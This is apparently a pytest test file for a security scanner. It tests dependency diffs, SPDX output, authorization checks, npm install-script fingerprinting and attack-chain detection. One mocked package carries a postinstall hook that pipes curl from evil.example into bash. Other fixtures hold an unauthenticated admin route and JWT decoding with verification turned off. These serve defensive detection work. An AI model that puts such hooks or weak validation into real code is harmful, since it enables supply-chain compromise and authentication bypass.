"""Tests for Phase 2: dependency diff, SPDX, authz, behavior, attack chains."""

from __future__ import annotations

import json
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import MagicMock, patch

import httpx

from argus.analysis.attack_chains import find_chains
from argus.core.config import Config
from argus.core.models import Finding, Location, ScanResult, Severity
from argus.core.plugin import ScannerContext
from argus.core.project import Project
from argus.inventory.dependency_diff import diff_packages
from argus.sbom.spdx import build_spdx
from argus.scanners.authz import AuthzScanner
from argus.scanners.dependency_diff import DependencyDiffScanner
from argus.supply_chain.behavior import BehaviorFingerprint, compare_fingerprints, npm_fingerprint
from argus.supply_chain.intel import is_malicious, load_malicious_packages
from argus.analysis import reachability


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


def _init_repo_with_dep_change(tmp_path: Path) -> Path:
    _git(tmp_path, "init")
    _git(tmp_path, "config", "user.email", "t@example.com")
    _git(tmp_path, "config", "user.name", "T")
    req = tmp_path / "requirements.txt"
    req.write_text("flask==2.0.0\n", encoding="utf-8")
    _git(tmp_path, "add", "requirements.txt")
    _git(tmp_path, "commit", "-m", "v1")
    req.write_text("flask==3.0.0\nrequests==2.31.0\n", encoding="utf-8")
    _git(tmp_path, "add", "requirements.txt")
    _git(tmp_path, "commit", "-m", "v2")
    return tmp_path


def test_diff_packages_detects_add_and_change(tmp_path: Path):
    repo = _init_repo_with_dep_change(tmp_path)
    changes = diff_packages(repo, "HEAD~1...HEAD")
    kinds = {c.change for c in changes}
    pkgs = {c.package for c in changes}
    assert "changed" in kinds or "added" in kinds
    assert "requests" in pkgs or "flask" in pkgs


def test_build_spdx(tmp_path: Path):
    (tmp_path / "requirements.txt").write_text("django==4.2.0\n", encoding="utf-8")
    doc = build_spdx(Project.from_path(tmp_path), name="demo")
    assert doc["spdxVersion"] == "SPDX-2.3"
    names = [p["name"] for p in doc["packages"] if p["name"] != "demo"]
    assert "django" in names


def test_authz_flags_missing_auth_on_admin_route(tmp_path: Path):
    app = tmp_path / "app.py"
    app.write_text(
        'from fastapi import FastAPI\napp = FastAPI()\n\n'
        '@app.get("/admin/users")\nasync def list_users():\n    return []\n',
        encoding="utf-8",
    )
    ctx = ScannerContext(project=Project.from_path(tmp_path), config=Config())
    rules = {f.rule_id for f in AuthzScanner().scan(ctx)}
    assert "authz.missing-authentication" in rules


def test_authz_flags_weak_jwt(tmp_path: Path):
    app = tmp_path / "auth.py"
    app.write_text(
        "import jwt\njwt.decode(token, verify=False)\n",
        encoding="utf-8",
    )
    ctx = ScannerContext(project=Project.from_path(tmp_path), config=Config())
    rules = {f.rule_id for f in AuthzScanner().scan(ctx)}
    assert "authz.jwt-weak-validation" in rules


def test_compare_fingerprints_install_script_added():
    old = BehaviorFingerprint("npm", "pkg", "1.0.0")
    new = BehaviorFingerprint(
        "npm", "pkg", "1.1.0",
        install_scripts=["postinstall"],
        suspicious_script=True,
    )
    anomalies = compare_fingerprints(old, new)
    assert any("install" in a.lower() for a in anomalies)


def test_npm_fingerprint_mocked():
    payload = {
        "scripts": {"postinstall": "curl http://evil.example | bash"},
        "bin": {"cli": "cli.js"},
        "dependencies": {"lodash": "1.0.0"},
    }

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json=payload)

    transport = httpx.MockTransport(handler)
    with httpx.Client(transport=transport) as client:
        with patch("argus.supply_chain.behavior.httpx.Client") as mock_cls:
            mock_cls.return_value.__enter__.return_value = client
            fp = npm_fingerprint("evil-pkg", "1.0.0")
    assert fp is not None
    assert fp.suspicious_script
    assert "postinstall" in fp.install_scripts


def test_malicious_intel_bundled_offline():
    load_malicious_packages.cache_clear()
    assert is_malicious("npm", "flatmap-stream", online=False)


def test_npm_reachability():
    tmp = Path(__file__).parent / "_tmp_npm"
    tmp.mkdir(exist_ok=True)
    try:
        (tmp / "index.js").write_text("const x = require('lodash');\n", encoding="utf-8")
        imports = reachability.collect_npm_imports(Project.from_path(tmp))
        assert reachability.npm_import_verdict("lodash", imports) == reachability.IMPORTED
        assert reachability.npm_import_verdict("left-pad", imports) == reachability.NOT_IMPORTED
    finally:
        (tmp / "index.js").unlink(missing_ok=True)
        tmp.rmdir()


def test_dependency_diff_scanner(tmp_path: Path):
    repo = _init_repo_with_dep_change(tmp_path)
    cfg = Config()
    cfg.scanner_options["dependency-diff"] = {
        "ref": "HEAD~1...HEAD",
        "behavior": False,
    }
    ctx = ScannerContext(project=Project.from_path(repo), config=cfg)
    findings = list(DependencyDiffScanner().scan(ctx))
    assert any(f.scanner == "dependency-diff" for f in findings)


def test_cross_file_attack_chain_kev_reachable():
    dep = Finding(
        id="d:1", rule_id="dependencies.cve", scanner="dependencies",
        title="CVE", description="", location=Location(path="requirements.txt"),
        severity=Severity.HIGH, tags=["kev"],
        metadata={"kev": True, "reachability": "imported"},
    )
    chains = find_chains([dep])
    assert any(c.id == "kev-reachable-dependency" for c in chains)


def test_cross_file_ssrf_cloud_secret_chain():
    ssrf = Finding(
        id="s:1", rule_id="patterns.ssrf", scanner="patterns",
        title="SSRF", description="", location=Location(path="a.py"),
        severity=Severity.HIGH, cwe=["CWE-918"],
    )
    secret = Finding(
        id="s:2", rule_id="secrets.aws", scanner="secrets",
        title="AWS key", description="",
        location=Location(path="b.py", snippet="AWS_SECRET=xxx"),
        severity=Severity.CRITICAL,
    )
    chains = find_chains([ssrf, secret])
    assert any(c.id == "ssrf-to-cloud-credentials" for c in chains)
